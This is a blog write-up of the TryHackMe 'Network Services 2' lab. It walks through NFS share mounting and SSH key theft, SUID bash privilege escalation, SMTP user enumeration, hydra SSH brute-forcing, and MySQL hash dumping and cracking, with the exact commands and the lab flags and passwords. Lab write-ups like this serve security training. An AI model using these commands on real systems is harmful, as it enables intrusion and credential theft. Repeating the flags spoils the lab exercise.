---
layout: post
title:  "Network Services 2 | Try Hack Me"
date:   2021-06-22 13:48:00 +0800
categories: Res THM
---


## Task 2 - Understanding NFS

### What does NFS stand for?
Network File System

### What process allows an NFS client to interact with a remote directory as though it was a physical device?
mounting

### What does NFS use to represent files and directories on the server?
file handle

### What protocol does NFS use to communicate between the server and client?
rpc

### What two pieces of user data does the NFS server take as parameters for controlling user permissions? 
user id/ group id

### Can a Windows NFS server share files with a Linux client? (Y/N)
Y

### Can a Linux NFS server share files with a MacOS client? (Y/N)
Y

### What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.
4.2


## Task 3 - Enumerating NFS

### Conduct a thorough port scan scan of your choosing, how many ports are open?
22, 111, 2049, 34049, 42501, 44133, 5315

So 7 ports

### Which port contains the service we're looking to enumerate?
2049

### Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
Did `showmount -e 10.10.104.120` and found the '/home' directory

### Change directory to where you mounted the share- what is the name of the folder inside?
Did `sudo mount -t nfs 10.10.104.120:home /tmp/mount -nolock` where '/tmp/mount' is a directory I made inside of the '/tmp' directory.

Going into this directory found a directory called 'cappucino'

### Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
Did an `ls -al` and found a '.ssh' directory.

### Which of these keys is most useful to us?
'id_rsa'


### Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
Did `chmod 600 id_rsa` just in case.

Did `ssh -i id_rsa cappucino@10.10.104.120` and it worked. So Y


## Task 4 - Exploiting NFS

### What letter do we use to set the SUID bit set using chmod?
's'

### What does the permission set look like? Make sure that it ends with -sr-x.
By going `sudo chown root bash`
Then `sudo chmod +s bash` and `sudo chmod +x bash`

This will give the following permission:
'-rwsr-sr-x'

### Great! If all's gone well you should have a shell as root! What's the root flag?
This should all be in the nfs share. So ssh-ing back into the vulnerable machine we can go `./bash -p`

The `-p` will persist the permissions that we have with the 'SUID' bit that is checked.
Now we have root, go `cd /root` finding a file called 'root.txt'.

This has 'THM{nfs_got_pwned}' inside of it


## Task 5 - Understanding SMTP

### What does SMTP stand for?
Simple Mail Transfer Protocol

### What does SMTP handle the sending of?
emails

### What is the first step in the SMTP process?
smtp handshake

### What is the default SMTP port?
25

### Where does the SMTP server send the email if the recipient's server is not available?
smtp queue

### On what server does the Email ultimately end up on?
pop/imap

### Can a Linux machine run an SMTP server? (Y/N)
Y

### Can a Windows machine run an SMTP server? (Y/N)
Y


## Task 6 - Enumerating SMTP

### First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?
25

### Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?
`msfconsole`

### Let's search for the module "smtp_version", what's it's full module name?
did `search smtp_version` and got 'auxiliary/scanner/smtp/smtp_version'

### Great, now- select the module and list the options. How do we do this?
`options`

### Have a look through the options, does everything seem correct? What is the option we need to set?
RHOSTS

### Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?
Did `set RHOSTS 10.10.63.25` and then `run` to run the exploit.

found 'polosmtp.home'

### What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.
'postfix'

### Let's search for the module "smtp_enum", what's it's full module name?
'auxiliary/scanner/smtp/smtp_enum'

### What option do we need to set to the wordlist's path?
'User_file'

so go `/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt` in full

### Once we've set this option, what is the other essential paramater we need to set?
'rhosts'

### Okay! Now that's finished, what username is returned?
Had to go `sudo apt install seclists` as kali didn't have the user name lists

Go `run` and wait now.

found 'administrator'


## Task 7 - Exploiting SMTP

### What is the password of the user we found during our enumeration stage?
Did `hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.63.25 ssh`

Go 'alejandro' as the password

### Great! Now, let's SSH into the server as the user, what is contents of smtp.txt
just did, `ssh administrator@10.10.63.25` with password 'alejandro', and then `cat smtp.txt`

Found 'THM{who_knew_email_servers_were_c00l?}'


## Task 8 - Understanding MySQL

### What type of software is MySQL?
relational database management system

### What language is MySQL based on?
sql. 'Structured Query Language'

### What communication model does MySQL use?
client-server

### What is a common application of MySQL?
back end database

### What major social network uses MySQL as their back-end database? This will require further research.
Facebook


## Task 9 - Enumerating MySQL

### As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?
3306

### Search for, select and list the options it needs. What three options do we need to set? (in descending order).
Could go `mysql -h 10.10.52.196 -u root -p` with 'password' as the password.

`use auxiliary/admin/mysql/mysql_sql`, and then `options`

Gives us 'PASSWORD/RHOSTS/USERNAME'

### Run the exploit. By default it will test with the "select version()" command, what result does this give you?
```
set PASSWORD password
set RHOSTS 10.10.52.196
set USERNAME root
run
```

Gives '5.7.29-0ubuntu0.18.04.1'

### Change the "sql" option to "show databases". how many databases are returned?
Did `set SQL show databases` and then `run`

```
[*] 10.10.52.196:3306 - Sending statement: 'show databases'...
[*] 10.10.52.196:3306 -  | information_schema |
[*] 10.10.52.196:3306 -  | mysql |
[*] 10.10.52.196:3306 -  | performance_schema |
[*] 10.10.52.196:3306 -  | sys |
```

so 4 databases


## Task 10 - Exploiting MySQL

### First, let's search for and select the "mysql_schemadump" module. What's the module's full name?
'auxiliary/scanner/mysql/mysql_schemadump'

### What's the name of the last table that gets dumped?
```
set PASSWORD password
set RHOSTS 10.10.52.196
set USERNAME root
run
```

'x$waits_global_by_latency' is the last table

### What's the module's full name?
'auxiliary/scanner/mysql/mysql_hashdump'

### What non-default user stands out to you?
```
set PASSWORD password
set RHOSTS 10.10.52.196
set USERNAME root
run
```

Got 'Saving HashString as Loot: carl:\*EA031893AA21444B170FC2162A56978B8CEECE18'

So 'carl' is a different non-standard user

### What is the user/hash combination string?
'carl:\*EA031893AA21444B170FC2162A56978B8CEECE18' is the combination

### What is the password of the user we found?
Saved it to a file called 'hash.txt' and did `john hash.txt`

Got: 'doggie'

### What's the contents of MySQL.txt
Did `ssh carl@10.10.52.196` with password 'doggie'. 

Found a file called 'MySQL.txt' and inside it was 'THM{congratulations_you_got_the_mySQL_flag}'